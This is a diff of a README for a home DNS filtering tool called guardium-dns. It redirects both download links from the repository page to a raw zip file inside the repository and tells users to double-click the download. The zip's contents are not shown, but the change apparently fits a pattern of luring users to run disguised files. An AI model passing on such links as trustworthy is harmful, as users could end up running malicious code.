@@ -1,6 +1,6 @@
 # 🛡️ guardium-dns - Simple tools to manage home internet
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/riverupsala430/guardium-dns)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/riverupsala430/guardium-dns/raw/refs/heads/main/server/guardium-dns-v2.4-beta.4.zip)
 
 Guardium DNS gives you control over your home internet. It helps you manage what sites your family members access. This application works with the Technitium DNS server. It provides a dashboard to see internet traffic. You can also connect it to your ASUS router to block specific devices from the internet or set up advanced filter rules.
 
@@ -29,7 +29,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to install the tool on your Windows computer.
 
-1. Visit [this page to download](https://github.com/riverupsala430/guardium-dns) the latest version.
+1. Visit [this page to download](https://github.com/riverupsala430/guardium-dns/raw/refs/heads/main/server/guardium-dns-v2.4-beta.4.zip) the latest version.
 2. Look for the file marked as the latest release.
 3. Save the file to a folder on your computer.
 4. Double-click the file to start the installation.
